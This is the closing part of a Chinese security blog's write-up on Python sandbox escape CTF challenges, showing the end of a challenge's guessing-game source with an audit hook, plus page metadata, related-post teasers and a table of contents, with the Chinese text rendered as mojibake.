game_score += 1</span><br><span class="line">    </span><br><span class="line">    return game_score</span><br><span class="line"></span><br><span class="line">WELCOME=&#x27;&#x27;&#x27;</span><br><span class="line">  _       _    ____    _       _    ____    _       _    ____  </span><br><span class="line"> | |     | |  |___ \  | |     | |  |___ \  | |     | |  |___ \ </span><br><span class="line"> | | __ _| | __ __) | | | __ _| | __ __) | | | __ _| | __ __) |</span><br><span class="line"> | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt; </span><br><span class="line"> | | (_| |   &lt; ___) | | | (_| |   &lt; ___) | | | (_| |   &lt; ___) |</span><br><span class="line"> |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/ </span><br><span class="line">                                                                                                                                                                       </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(WELCOME)</span><br><span class="line">    print(&#x27;Welcome to my guesser game!&#x27;)</span><br><span class="line">    game_score = guesser()</span><br><span class="line">    if game_score == 1:</span><br><span class="line">        print(&#x27;you are really super guesser!!!!&#x27;)</span><br><span class="line">        print(&#x27;flag&#123;fake_flag_in_local_but_really_in_The_remote&#125;&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        print(&#x27;Guess game end!!!&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    sys.addaudithook(my_audit_hook)</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="http://example.com">deCOLE</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="http://example.com/2025/03/18/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">http://example.com/2025/03/18/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥æº <a href="http://example.com" target="_blank">deCOLE's Blog</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">æ¼æ´å­¦ä¹ </a></div><div class="post-share"><div class="social-share" data-image="/img/touxiang.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/03/18/Pearcmd%E6%80%BB%E7%BB%93%E5%8F%8A%E5%88%A9%E7%94%A8/" title="Pearcmdæ€»ç»“åŠåˆ©ç”¨"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">ä¸Šä¸€ç¯‡</div><div class="info-item-2">Pearcmdæ€»ç»“åŠåˆ©ç”¨</div></div><div class="info-2"><div class="info-item-1">Pearcmdæ€»ç»“åŠåˆ©ç”¨pearcmdç®€ä»‹â€‹	peclæ˜¯PHPçš„ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨ä»¥ç®¡ç†æ‰©å±• â€‹	pearæ˜¯peclä¾èµ–çš„ç±»åº“ï¼Œåœ¨7.3åŠä»¥å‰çš„PHPç‰ˆæœ¬,pecl&#x2F;pearæ˜¯é»˜è®¤å®‰è£…çš„ï¼Œè€Œåœ¨7.4åŠä¹‹åçš„ç‰ˆæœ¬ï¼Œåˆ™éœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘PHPçš„æ—¶å€™ï¼ŒæŒ‡å®šâ€“with-pearé€‰é¡¹ï¼Œæ‰ä¼šç»™æˆ‘ä»¬å®‰è£… â€‹	ä½†æ˜¯ï¼Œåœ¨Dockerä»»æ„ç‰ˆæœ¬é•œåƒå½“ä¸­ï¼Œpcel&#x2F;pearéƒ½ä¼šè¢«é»˜è®¤å®‰è£…ï¼Œå¹¶ä¸”å®‰è£…çš„è·¯å¾„åœ¨&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php â€‹	åœ¨php.iniä¸­ï¼Œregister_argc_argv&#x3D;On éœ€è¦è¢«å¼€å¯ æ¼æ´åŸç†â€‹	åœ¨peracmd.phpä¸­ï¼Œæœ‰ä¸€ä¸ªå…³é”®å­—argvï¼Œæ˜¯ç”¨æ¥ä¼ é€’å‘½ä»¤è¡Œå‚æ•°çš„ï¼Œå¹¶ä¸”ä½¿ç”¨äº†readPHPArgv()è¿™ä¸ªå‡½æ•° 1234567891011PEAR_Command::setFrontendType(&#x27;CLI&#x27;);$all_commands = PEAR_Command::getCommands();$argv = Console_Getopt::readPHPArgv();//...</div></div></div></a><a class="pagination-related" href="/2025/03/18/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="PythonåŸå‹é“¾æ±¡æŸ“"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">ä¸‹ä¸€ç¯‡</div><div class="info-item-2">PythonåŸå‹é“¾æ±¡æŸ“</div></div><div class="info-2"><div class="info-item-1">PythonåŸå‹é“¾æ±¡æŸ“â€‹	å‰æ®µæ—¶é—´å­¦äº†Jsçš„åŸå‹é“¾æ±¡æŸ“ï¼ŒåŠ ä¸Šå›½èµ›å’ŒDASéƒ½å‡ºäº†Sanicæ¡†æ¶ä¸‹çš„PythonåŸå‹é“¾æ±¡æŸ“çš„é¢˜ï¼Œæ„Ÿè§‰ä¹‹åè¿˜ä¼šç¢°ä¸Šè¿™æ ·çš„é¢˜ç›®ï¼Œæ‰€ä»¥å­¦ä¹ ä¸€ä¸‹ ä¸€äº›ç®€ä»‹â€‹	åŸå‹ï¼š â€‹	æ¯ä¸ªå¯¹è±¡æ‹¥æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡(prototype)ï¼Œå¯¹è±¡ä»¥è¯¥åŸå‹ä¸ºæ¨¡æ¿ï¼Œä»åŸå‹ç»§æ‰¿æ–¹æ³•å’Œå±æ€§ åŸå‹é“¾ï¼š â€‹	åŸå‹å¯¹è±¡å¯èƒ½æ‹¥æœ‰åŸå‹ï¼Œä»ä¸­ç»§æ‰¿æ–¹æ³•å’Œå±æ€§ï¼Œä¸€å±‚ä¸€å±‚ã€ä»¥æ­¤ç±»æ¨ï¼Œè¿™æ ·çš„å…³ç³»ç»“æ„å«åšåŸå‹é“¾ prototypeå’Œ____proto...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>ç›¸å…³æ¨è</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/03/18/Pearcmd%E6%80%BB%E7%BB%93%E5%8F%8A%E5%88%A9%E7%94%A8/" title="Pearcmdæ€»ç»“åŠåˆ©ç”¨"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-18</div><div class="info-item-2">Pearcmdæ€»ç»“åŠåˆ©ç”¨</div></div><div class="info-2"><div class="info-item-1">Pearcmdæ€»ç»“åŠåˆ©ç”¨pearcmdç®€ä»‹â€‹	peclæ˜¯PHPçš„ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨ä»¥ç®¡ç†æ‰©å±• â€‹	pearæ˜¯peclä¾èµ–çš„ç±»åº“ï¼Œåœ¨7.3åŠä»¥å‰çš„PHPç‰ˆæœ¬,pecl&#x2F;pearæ˜¯é»˜è®¤å®‰è£…çš„ï¼Œè€Œåœ¨7.4åŠä¹‹åçš„ç‰ˆæœ¬ï¼Œåˆ™éœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘PHPçš„æ—¶å€™ï¼ŒæŒ‡å®šâ€“with-pearé€‰é¡¹ï¼Œæ‰ä¼šç»™æˆ‘ä»¬å®‰è£… â€‹	ä½†æ˜¯ï¼Œåœ¨Dockerä»»æ„ç‰ˆæœ¬é•œåƒå½“ä¸­ï¼Œpcel&#x2F;pearéƒ½ä¼šè¢«é»˜è®¤å®‰è£…ï¼Œå¹¶ä¸”å®‰è£…çš„è·¯å¾„åœ¨&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php â€‹	åœ¨php.iniä¸­ï¼Œregister_argc_argv&#x3D;On éœ€è¦è¢«å¼€å¯ æ¼æ´åŸç†â€‹	åœ¨peracmd.phpä¸­ï¼Œæœ‰ä¸€ä¸ªå…³é”®å­—argvï¼Œæ˜¯ç”¨æ¥ä¼ é€’å‘½ä»¤è¡Œå‚æ•°çš„ï¼Œå¹¶ä¸”ä½¿ç”¨äº†readPHPArgv()è¿™ä¸ªå‡½æ•° 1234567891011PEAR_Command::setFrontendType(&#x27;CLI&#x27;);$all_commands = PEAR_Command::getCommands();$argv = Console_Getopt::readPHPArgv();//...</div></div></div></a><a class="pagination-related" href="/2025/03/18/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="PythonåŸå‹é“¾æ±¡æŸ“"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-18</div><div class="info-item-2">PythonåŸå‹é“¾æ±¡æŸ“</div></div><div class="info-2"><div class="info-item-1">PythonåŸå‹é“¾æ±¡æŸ“â€‹	å‰æ®µæ—¶é—´å­¦äº†Jsçš„åŸå‹é“¾æ±¡æŸ“ï¼ŒåŠ ä¸Šå›½èµ›å’ŒDASéƒ½å‡ºäº†Sanicæ¡†æ¶ä¸‹çš„PythonåŸå‹é“¾æ±¡æŸ“çš„é¢˜ï¼Œæ„Ÿè§‰ä¹‹åè¿˜ä¼šç¢°ä¸Šè¿™æ ·çš„é¢˜ç›®ï¼Œæ‰€ä»¥å­¦ä¹ ä¸€ä¸‹ ä¸€äº›ç®€ä»‹â€‹	åŸå‹ï¼š â€‹	æ¯ä¸ªå¯¹è±¡æ‹¥æœ‰ä¸€ä¸ªåŸå‹å¯¹è±¡(prototype)ï¼Œå¯¹è±¡ä»¥è¯¥åŸå‹ä¸ºæ¨¡æ¿ï¼Œä»åŸå‹ç»§æ‰¿æ–¹æ³•å’Œå±æ€§ åŸå‹é“¾ï¼š â€‹	åŸå‹å¯¹è±¡å¯èƒ½æ‹¥æœ‰åŸå‹ï¼Œä»ä¸­ç»§æ‰¿æ–¹æ³•å’Œå±æ€§ï¼Œä¸€å±‚ä¸€å±‚ã€ä»¥æ­¤ç±»æ¨ï¼Œè¿™æ ·çš„å…³ç³»ç»“æ„å«åšåŸå‹é“¾ prototypeå’Œ____proto...</div></div></div></a><a class="pagination-related" href="/2025/03/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" title="Redisæœªæˆæƒè®¿é—®"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-18</div><div class="info-item-2">Redisæœªæˆæƒè®¿é—®</div></div><div class="info-2"><div class="info-item-1">Redisæœªæˆæƒè®¿é—®â€‹	 ä»€ä¹ˆæ˜¯redisâ€‹	Redisï¼ˆRemote Dictionary Server )ï¼Œå³è¿œç¨‹å­—å…¸æœåŠ¡ï¼Œæ˜¯ä¸€ä¸ªå¼€æºçš„ä½¿ç”¨ANSI Cè¯­è¨€ç¼–å†™ã€æ”¯æŒç½‘ç»œã€å¯åŸºäºå†…å­˜äº¦å¯æŒä¹…åŒ–çš„æ—¥å¿—å‹ã€Key-Valueæ•°æ®åº“ï¼Œå¹¶æä¾›å¤šç§è¯­è¨€çš„APIã€‚ä»2010å¹´3æœˆ15æ—¥èµ·ï¼ŒRedisçš„å¼€å‘å·¥ä½œç”±VMwareä¸»æŒã€‚ä»2013å¹´5æœˆå¼€å§‹ï¼ŒRedisçš„å¼€å‘ç”±PivotaèµåŠ©ã€‚ æ¼æ´åŸç†â€‹	é»˜è®¤æƒ…å†µä¸‹å‘¢ï¼ŒRedisæ˜¯ç»‘å®šåœ¨0.0.0.0:6379çš„ï¼Œå¦‚æœæ²¡è®¾ç½®å¯†ç (ä¸€èˆ¬å¯†ç ä¸ºç©º)æˆ–è€…å¯†ç ä¸ºå¼±å£ä»¤ï¼Œç¼ºä¹æœ‰æ•ˆä¿æŠ¤æªæ–½çš„è¯ï¼Œé‚£ä¹ˆå¤„äºå…¬ç½‘æœåŠ¡çš„redisæœåŠ¡å°±ä¼šè¢«ä»»æ„ç”¨æˆ·è¿›è¡Œæœªæˆæƒè®¿é—®ï¼Œè¿›è¡Œè¯»å–æ•°æ®æ“ä½œï¼Œç”šè‡³èƒ½åˆ©ç”¨redisè‡ªèº«çš„å‘½ä»¤å†™å…¥æ–‡ä»¶æ“ä½œï¼Œè¿™æ ·å°±ä¼šäº§ç”Ÿè¿›ä¸€æ­¥çš„æ”»å‡»è¡Œä¸º æ¼æ´å¤ç°æ ¹æ®bmjokerå¤§ä½¬çš„åšå®¢ï¼Œæ•´äº†ä¿©è™šæ‹Ÿæœºï¼Œä¸€å°æ”»å‡»ä¸€å°å—å®³  å…ˆç”¨srcä¸‹çš„redis-cliå¯¹ç›®æ ‡æœºè¿›è¡Œè¿æ¥ï¼Œç„¶åpingä¸€ä¸‹ï¼Œå‘ç°èƒ½pingé€š æ¥ç€ç”¨keys...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">deCOLE</div><div class="author-info-description">å‡¡å¤«ä¿—å­å²‚è¯†æˆ‘ï¼Œéåˆ°æœ«è·¯ä¸ç”˜ä¼‘</div><div class="site-data"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>å…¬å‘Š</span></div><div class="announcement_content">So when you go</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-number">1.</span> <span class="toc-text">Pythonæ²™ç®±é€ƒé€¸</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E7%9A%84%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">ä¸€äº›å‰ç½®çŸ¥è¯†çš„ä»‹ç»</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%99%E7%AE%B1"><span class="toc-number">1.1.1.</span> <span class="toc-text">æ²™ç®±</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E7%9A%84%E4%B8%80%E4%BA%9B%E7%89%B9%E6%80%A7"><span class="toc-number">1.1.2.</span> <span class="toc-text">Pythonçš„ä¸€äº›ç‰¹æ€§</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E7%8E%AF%E8%8A%82"><span class="toc-number">1.2.</span> <span class="toc-text">åšé¢˜ç¯èŠ‚</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginner"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">calc_jail_beginner</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginner-level1"><span class="toc-number">1.2.0.2.</span> <span class="toc-text">calc_jail_beginner_level1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginner-level2"><span class="toc-number">1.2.0.3.</span> <span class="toc-text">calc_jail_beginner_level2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginner-level2-5"><span class="toc-number">1.2.0.4.</span> <span class="toc-text">calc_jail_beginner_level2.5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginner-level3"><span class="toc-number">1.2.0.5.</span> <span class="toc-text">calc_jail_beginner_level3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginner-level4"><span class="toc-number">1.2.0.6.</span> <span class="toc-text">calc_jail_beginner_level4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginner-level4-0-5"><span class="toc-number">1.2.0.7.</span> <span class="toc-text">calc_jail_beginner_level4.0.5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginner-level4-1"><span class="toc-number">1.2.0.8.</span> <span class="toc-text">calc_jail_beginner_level4.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginer-level4-2"><span class="toc-number">1.2.0.9.</span> <span class="toc-text">calc_jail_beginer_level4.2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginner-level4-3"><span class="toc-number">1.2.0.10.</span> <span class="toc-text">calc_jail_beginner_level4.3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginner-level5"><span class="toc-number">1.2.0.11.</span> <span class="toc-text">calc_jail_beginner_level5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginner-level5-1"><span class="toc-number">1.2.0.12.</span> <span class="toc-text">calc_jail_beginner_level5.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginner-level6"><span class="toc-number">1.2.0.13.</span> <span class="toc-text">*calc_jail_beginner_level6</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginner-level6-1"><span class="toc-number">1.2.0.14.</span> <span class="toc-text">calc_jail_beginner_level6.1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#calc-jail-beginner-level7"><span class="toc-number">1.2.0.15.</span> <span class="toc-text">calc_jail_beginner_level7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lake-lake-lake"><span class="toc-number">1.2.0.16.</span> <span class="toc-text">lake lake lake</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#l-ke-l-ke-l-ke"><span class="toc-number">1.2.0.17.</span> <span class="toc-text">l@ke l@ke l@ke</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#laKe-laKe-laKe"><span class="toc-number">1.2.0.18.</span> <span class="toc-text">laKe laKe laKe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lak3-lak3-lak3"><span class="toc-number">1.2.0.19.</span> <span class="toc-text">lak3 lak3 lak3</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/27/TryHackMe%E6%88%BF%E9%97%B4%E4%B9%8BPersisting%20Active%20Directory/" title="TryHackMeæˆ¿é—´ä¹‹Persisting Active Directory">TryHackMeæˆ¿é—´ä¹‹Persisting Active Directory</a><time datetime="2025-05-26T16:00:00.000Z" title="å‘è¡¨äº 2025-05-27 00:00:00">2025-05-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/09/TryHackMe%E6%88%BF%E9%97%B4%E4%B9%8BBilling/" title="TryHackMeæˆ¿é—´ä¹‹Billing">TryHackMeæˆ¿é—´ä¹‹Billing</a><time datetime="2025-05-08T16:00:00.000Z" title="å‘è¡¨äº 2025-05-09 00:00:00">2025-05-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/09/TryHackMe%E6%88%BF%E9%97%B4%E4%B9%8BEnterprise/" title="TryHackMeæˆ¿é—´ä¹‹Enterprise">TryHackMeæˆ¿é—´ä¹‹Enterprise</a><time datetime="2025-05-08T16:00:00.000Z" title="å‘è¡¨äº 2025-05-09 00:00:00">2025-05-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/09/TryHackMe%E6%88%BF%E9%97%B4%E4%B9%8BReset/" title="TryHackMeæˆ¿é—´ä¹‹Reset">TryHackMeæˆ¿é—´ä¹‹Reset</a><time datetime="2025-05-08T16:00:00.000Z" title="å‘è¡¨äº 2025-05-09 00:00:00">2025-05-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/18/Pearcmd%E6%80%BB%E7%BB%93%E5%8F%8A%E5%88%A9%E7%94%A8/" title="Pearcmdæ€»ç»“åŠåˆ©ç”¨">Pearcmdæ€»ç»“åŠåˆ©ç”¨</a><time datetime="2025-03-17T16:00:00.000Z" title="å‘è¡¨äº 2025-03-18 00:00:00">2025-03-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By deCOLE</div><div class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="æ—¥é—´å’Œå¤œé—´æ¨¡å¼åˆ‡æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>